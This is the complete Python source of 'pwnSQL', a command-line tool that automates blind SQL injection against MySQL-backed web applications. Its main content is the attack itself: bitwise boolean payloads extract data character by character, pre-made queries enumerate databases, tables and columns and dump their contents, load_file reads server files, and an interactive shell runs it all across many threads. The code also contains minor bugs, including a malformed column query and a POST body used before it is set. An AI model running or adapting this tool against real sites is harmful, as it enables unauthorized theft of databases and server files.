#!/usr/bin/env python
#coding=utf8
__author__	= "haxom"
__email__	= "haxom@haxom.net"
__file__	= "pwnSQL.py"
__version__	= "1.3"

## Imports ##
from optparse import OptionParser
import sys
import httplib2
from urllib2 import quote
from threading import Thread, active_count
from time import sleep

## Useful functions ##
def getChar(char):
	# Result form: CHAR(11,22,33,44,11,22)
	result = 'CHAR('
	for c in char:
		result = result + str(ord(c)) + ','
	result = result[:-1] + ')'
	return result

def getContent(payload):
        payload = options.prefix + payload + options.suffix
	payload = quote(payload)
	http = httplib2.Http()
	content = ''
	url = options.url.replace('PAYLOAD', payload)
	print url
	if options.body:
		body = options.body.replace('PAYLOAD', body)
	if options.method == "GET":
		resp, content = http.request(url, 'GET', headers={'User-agent':options.user_agent, 'Cookie':options.cookie})
	elif options.method == "POST":
		resp, content = http.request(url, 'POST', headers={'User-agent':options.user_agent, 'Cookie':options.cookie, 'Content-type':'application/x-www-form-urlencoded'}, body=body)
	return content

## Injections ##
def getchar(query, char_idx, result):
	decimal = "ASCII"
	if options.decimal == 2:
		decimal = "ORD"
	# default blind : SUBSTR
	blind = '(SELECT IF((SELECT '+decimal+'(SUBSTR(({1}), {2}, 1))&{0})={0}, 1, 11))#'
	if options.char == 2: # MID
		blind = '(SELECT IF((SELECT '+decimal+'(MID(({1}), {2}, 1))&{0})={0}, 1, 11))#'
	if options.char == 3: # LEFT+RIGHT
		blind = '(SELECT IF((SELECT '+decimal+'(RIGHT(LEFT(({1}), {2}),1))&{0})={0} and {2}<=(SELECT LENGTH(({1}))), 1, 11))#'
	if options.char == 4: # LPAD+RIGHT
		blind = '(SELECT IF((SELECT '+decimal+'(RIGHT(LPAD(({1}), {2}, ""),1))&{0})={0}, 1, 11))#'
	if options.char == 5: # RPAD+RIGHT
		blind = '(SELECT IF((SELECT '+decimal+'(RIGHT(RPAD(({1}), {2}, ""),1))&{0})={0}, 1, 11))#'
	if options.char == 6: # LIKE (without decimal but bug with char % and _ : word is truncated)
		blind = '(SELECT ({0}) LIKE BINARY {1})#'
	char = 0
	bitmap = []

	# Case 6 : LIKE (without decimal but bug with char % and _ : word is truncated)
	if options.char == 6:
		for i in range(0,127):
			if i != 37 and i != 95: # case % or _
				char = i
				payload = blind.format(query, getChar(result+chr(char)+'%'), char_idx)
				content = getContent(payload)
				if ((options.detection == 2 and options.pattern not in content) or (options.detection == 1 and options.pattern in content)):
					return char
		return 0
	else:
		for bit_idx in xrange(7):
			payload = blind.format(1<<bit_idx, query, char_idx)
			content = getContent(payload)
			if ((options.detection == 2 and options.pattern not in content) or (options.detection == 1 and options.pattern in content)):
				bitmap.append(bit_idx)
		for i in bitmap:
			char |= 1 << i
	return char

def query(query):
	char_idx = 1
	result = ''
	while True:
		c = getchar(query, char_idx, result)
		if c in (127, 0):
			break
		result += chr(c)
		char_idx += 1
	return result

def queryThread(results, index, request):
	results[index] = query(request)

## Pre-made SQL ##
# database
def databasesCount():
	return 'SELECT COUNT(DISTINCT TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES'
def database(index):
	return 'SELECT DISTINCT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES LIMIT '+str(index)+', 1'
# tables
def tablesCount():
	return 'SELECT COUNT(DISTINCT TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES'
def tablesCountFromDB(db_name):
	return 'SELECT COUNT(DISTINCT TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='+getChar(db_name)
def table(index):
	return 'SELECT DISTINCT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT '+str(index)+', 1'
def tableFromDB(db_name, index):
	return 'SELECT DISTINCT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='+getChar(db_name)+' LIMIT '+str(index)+', 1'
# columns
def columnsCount():
	return 'SELECT COUNT(DISTINCT COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS'
def columns(index):
	return 'SELECT DISTINCT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE LIMIT '+str(index)+', 1'
def columnsCountFromDBandTable(db_name, table_name):
	return 'SELECT COUNT(DISTINCT COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='+getChar(db_name)+' AND TABLE_NAME='+getChar(table_name)
def columnFromDBandTable(db_name, table_name, index):
	return 'SELECT DISTINCT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='+getChar(db_name)+' AND TABLE_NAME='+getChar(table_name)+' LIMIT '+str(index)+', 1'
# data
def contentCountFromDBandTable(db_name, table_name, content):
	return 'SELECT COUNT('+content+') FROM '+db_name+'.'+table_name
def contentFromDBandTable(db_name, table_name, content, index):
	return 'SELECT '+content+' FROM '+db_name+'.'+table_name+' LIMIT '+str(index)+', 1'
def contentCountFromTable(table_name, content):
	return 'SELECT COUNT('+content+') FROM '+table_name
def contentFromTable(table_name, content, index):
	return 'SELECT '+content+' FROM '+table_name+' LIMIT '+str(index)+', 1'
# others
def getFileLen(filename):
	return 'SELECT LENGTH(load_file('+getChar(filename)+'))'
def getFile(filename):
	return 'SELECT load_file('+getChar(filename)+')'
def getFilePart(filename, begin, length):
	if length == -1:
		return 'SELECT SUBSTR(load_file('+getChar(filename)+'),'+str(begin)+')'
	else:
		return 'SELECT SUBSTR(load_file('+getChar(filename)+'),'+str(begin)+','+str(length)+')'

## Additionnals function for threading ##

def databasesThreading(begin, end):
	for i in range(begin, end+1):
		print query(database(i))

def tablesThreading(database, begin, end):
	for i in range(begin, end+1):
		print query(tableFromDB(database, i))

def columnsThreading(database, table, begin, end):
	for i in range(begin, end+1):
		print query(columnFromDBandTable(database, table, i))

def contentsThreading(database, table, columns, begin, end):
	for i in range(begin, end+1):
		values = []
		for c in columns:
			values.append(query(contentFromDBandTable(database, table, c, i)))
		final = ''
		for v in values:
			final = final + v + ':'
		print final[:-1]

## CMD interaction ##
def shellHelp():
	print "--- Functions available ---"
	print "> databases"
	print "> tables from [db]"
	print "> columns from [db] [tables]"
	print "> dump from [db] [tables] [col1] [col2] [...]"
	print "> get [remote-file] [(optionnal) local-file]"
	print "> [SQL command] (no multi-threading)"
	print "> help"
	print "> quit"
	print "----------------------------"

def shell(init=0):
	try:
		if init == 1:
			shellHelp()
		choix = None
		choix_u = raw_input(">> ")
		choix = choix_u.split(" ")

		# databases
		if str(choix[0]) == "databases":
			nb_db = query(databasesCount())
			nb_db = int(nb_db)
			print ">] %d database(s) counted" % nb_db
			if options.threads > 1:
				limit = nb_db / (options.threads-1)
			else:
				limit = 0
			if limit < 1:
				for i in range(0, nb_db):
					print "%s" % query(database(i))
			else:
				threads = [None] * options.threads
				for i in range(0, options.threads-1):
					threads[i] = Thread(target=databasesThreading, args=(limit*i, limit*(i+1)-1))
					threads[i].setDaemon(True)
					threads[i].start()
				if limit*(options.threads-1) !=  nb_db-1:
					threads[options.threads-1] = Thread(target=databasesThreading, args=(limit*(options.threads-1), nb_db-1))
					threads[options.threads-1].setDaemon(True)
					threads[options.threads-1].start()
				while active_count() > 1:
					sleep(0.5)

		# tables
		elif str(choix[0]) == "tables" and str(choix[1]) == "from":
			nb_tables = query(tablesCountFromDB(choix[2]))
			nb_tables = int(nb_tables)
			print ">] %d table(s) counted from db %s" % (nb_tables, choix[2])
			if options.threads > 1:
				limit = nb_tables / (options.threads-1)
			else:
				limit = 0
			if limit < 1:
				for i in range(0, int(nb_tables)):
					print "%s" % query(tableFromDB(choix[2], i))
			else:
				threads = [None] * options.threads
				for i in range(0, options.threads-1):
					threads[i] = Thread(target=tablesThreading, args=(choix[2], limit*i, limit*(i+1)-1))
					threads[i].setDaemon(True)
					threads[i].start()
				if limit*(options.threads-1) != nb_tables-1:
					threads[options.threads-1] = Thread(target=tablesThreading, args=(choix[2], limit*(options.threads-1), nb_tables-1))
					threads[options.threads-1].setDaemon(True)
					threads[options.threads-1].start()
				while active_count() > 1:
					sleep(0.5)

		# columns
		elif str(choix[0]) == "columns" and str(choix[1]) == "from":
			nb_columns = query(columnsCountFromDBandTable(choix[2], choix[3]))
			nb_columns = int(nb_columns)
			print ">] %d column(s) counted from %s.%s" % (nb_columns, choix[2], choix[3])
			if options.threads > 1:
				limit = nb_columns / (options.threads-1)
			else:
				limit = 0
			if limit < 1:
				for i in range(0, int(nb_columns)):
					print "%s" % query(columnFromDBandTable(choix[2], choix[3], i))
			else:
				threads = [None] * options.threads
				for i in range(0, options.threads-1):
					threads[i] = Thread(target=columnsThreading, args=(choix[2], choix[3], limit*i, limit*(i+1)-1))
					threads[i].setDaemon(True)
					threads[i].start()
				if limit*(options.threads-1) != nb_columns-1:
					threads[options.threads-1] = Thread(target=columnsThreading, args=(choix[2], choix[3], limit*(options.threads-1), nb_columns-1))
					threads[options.threads-1].setDaemon(True)
					threads[options.threads-1].start()
				while active_count() > 1:
					sleep(0.5)

		# dump
		elif str(choix[0]) == "dump" and str(choix[1]) == "from":
			columns = []
			for i in range(4, len(choix)):
				columns.append(str(choix[i]))
			nb_contents = query(contentCountFromDBandTable(choix[2], choix[3], columns[0]))
			nb_contents = int(nb_contents)
			print ">] %d entry/ies counted from %s.%s.%s" % (nb_contents, choix[2], choix[3], columns[0])
			if options.threads > 1:
				limit = nb_contents / (options.threads-1)
			else:
				limit = 0
			if limit < 1:
				for i in range(0, int(nb_contents)):
					values = []
					for c in columns:
						values.append(query(contentFromDBandTable(choix[2], choix[3], c, i)))
					final = ''
					for v in values:
						final = final + v + ':'
					print final[:-1]
			else:
				threads = [None] * options.threads
				for i in range(0, options.threads-1):
					threads[i] = Thread(target=contentsThreading, args=(choix[2], choix[3], columns, limit*i, limit*(i+1)-1))
					threads[i].setDaemon(True)
					threads[i].start()
				if limit*(options.threads-1) != nb_contents-1:
					threads[options.threads-1] = Thread(target=contentsThreading, args=(choix[2], choix[3], columns, limit*(options.threads-1), nb_contents-1))
					threads[options.threads-1].setDaemon(True)
					threads[options.threads-1].start()
				while active_count() > 1:
					sleep(0.5)

		# get
		elif str(choix[0]) == "get":
			length = query(getFileLen(choix[1]))
			if len(length) == 0:
				length = '0'
			length = int(length)
			print ">] File %s has length of %d bytes" % (choix[1], length)
			if int(length) < 1:
				print ">] hum... file is empty, or does not exist, or maybe not readable."
			else:
				print ">] getting %s file (could take time...)" % choix[1]
			if options.threads > 1:
				limit = length / (options.threads-1)
			else:
				limit = 0
			final = ""
			if limit < 1:
				final = query(getFile(str(choix[1])))
			else:
				threads = [None] * options.threads
				results = dict()
				for i in range(0, options.threads-1):
					threads[i] = Thread(target=queryThread, args=(results, i, getFilePart(choix[1], 1+limit*i, limit)))
					threads[i].setDaemon(True)
					threads[i].start()
				if (1+limit*(options.threads-1)) != length:
					threads[options.threads-1] = Thread(target=queryThread, args=(results, options.threads-1, getFilePart(choix[1], 1+limit*(options.threads-1), -1)))
					threads[options.threads-1].setDaemon(True)
					threads[options.threads-1].start()
				while active_count() > 1:
					sleep(0.5)
				for i in range(0, len(results)):
					final = final + results[i]
			if len(choix) == 3:
				fp = open(choix[2], 'w')
				fp.write(final)
				fp.close()
				print ">] content saved in %s" % choix[2]
			else:
				print final

		# help
		elif str(choix[0]) == "help":
			shellHelp()

		# quit
		elif str(choix[0]) == "quit" or str(choix[0]) == "exit":
			return

		# others
		else:
			print query(choix_u)
	except Exception as err:
			print "!] Error occured : %s" % str(err)
	shell()

## Params ##
def getParams(print_params=False):
	parser = OptionParser()
	parser.add_option('', '--url', dest='url', help='URL of the target')
	parser.add_option('', '--body', dest='body', help='Body of the POST')
	parser.add_option('', '--method', dest='method', help='HTTP method (GET/POST)', default='GET')
	parser.add_option('', '--user-agent', dest='user_agent', default='Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1', help='Custom user-agent')
	parser.add_option('', '--cookie', dest='cookie', default='', help='Custom cookies')
	parser.add_option('', '--suffix', dest='suffix', default='', help='Add suffix string')
	parser.add_option('', '--prefix', dest='prefix', default='', help='Add prefix string')
	parser.add_option('', '--detection-type', dest='detection', help='1: valid pattern / 2: error pattern', default=1)
	parser.add_option('', '--pattern', dest='pattern', default='1', help='Pattern to test')
	parser.add_option('', '--threads', dest='threads', default=10, help='Number of threads')
	parser.add_option('', '--char-method', dest='char', default=1, help='Method to get chars | 1: SUBSTR / 2: MID / 3: LEFT+RIGHT / 4: LPAD+RIGHT / 5: RPAD+RIGHT / 6: LIKE (no decimal required))')
	parser.add_option('', '--decimal-method', dest='decimal', default="1", help='Method to get decimals | 1: ASCII / 2: ORD')

	global options
	(options, args) = parser.parse_args(sys.argv)

	# Checks & auto-type
	options.detection = int(options.detection)
	options.threads = int(options.threads)
	options.char = int(options.char)
	options.decimal = int(options.decimal)

	if not options.url:
		print "/!\\ Option --url is required /!\\"
		sys.exit()
	if not options.method or (options.method != "POST" and options.method != "GET"):
		print "/!\\ Option --method is invalid /!\\"
		sys.exit()
	if not options.detection or (options.detection != 2 and options.detection != 1):
		print "/!\\ Option --detection-type is invalid /!\\"
		sys.exit()
	if not options.threads or options.threads < 1:
		print "/!\\ Option --threads should be an integer >= 1 /!\\"
		sys.exit()
	if not options.char or (options.char < 1 or options.char > 6):
		print "/!\\ Option --char-method is invalid /!\\"
		sys.exit()
	if not options.decimal or (options.decimal != 1 and options.decimal != 2):
		if options.char != 6: # decimal is not required for LIKE method
			print "/!\\ Option --decimal-method is invalid /!\\"
			sys.exit()

## Main ##

if __name__ == '__main__':
	print "\n\t>>>>  pwnSQL  <<<<\n"
	print ">] Analysing parameters ..."
	getParams(True)
	print ">] Testing blind injection ..."
	if options.detection == 2:
		if options.pattern in getContent('(SELECT 1)'):
			print " + valid pattern => KO"
		else:
			print " + valid pattern => OK"
		if options.pattern in getContent('(SELECT 11)'):
			print " + error pattern => OK"
		else:
			print " + error pattern => KO"
	else:
		if options.pattern in getContent('(SELECT 1)'):
			print " + valid pattern => OK"
		else:
			print " + valid pattern => KO"
		if options.pattern in getContent('(SELECT 11)'):
			print " + error pattern KO"
		else:
			print " + error pattern OK"

	print "] OK... anyway if tests are good or not, starting the shell..."
	shell(1)

